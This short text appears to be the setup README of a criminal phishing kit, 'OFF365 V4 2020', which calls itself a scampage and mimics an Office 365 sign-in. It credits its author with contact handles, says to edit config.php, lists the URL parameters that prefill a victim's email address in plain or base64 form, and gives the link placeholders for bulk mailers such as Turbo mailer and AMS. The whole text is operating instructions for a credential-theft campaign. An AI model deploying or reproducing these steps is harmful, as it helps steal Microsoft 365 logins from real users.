/* 
OFF365 V4 2020 by ExRobotos
Email: ex.robotos.official@gmail.com
Facebook: facebook.com/Ex.Robotos
ICQ: @Ex.Robotos
*/

1- Edit config.php
2- This scampage support 6 email grab types
 + https://yourlink.com/office/?email= emailbase64 or only email
 + https://yourlink.com/office/?target= emailbase64 or only email
 + https://yourlink.com/office/?code= emailbase64 or only email
3- Set up on sender
 + Turbo mailer: https://yourlink.com/office/?target=%0%
 + AMS: https://yourlink.com/office/?target=%RCPT_ADDRESS%
 + A-29 or B-29: https://yourlink.com/office/{NEWAUTOLINK}
or
 + A-29 or B-29: https://yourlink.com/office/<NEWAUTOLINK>
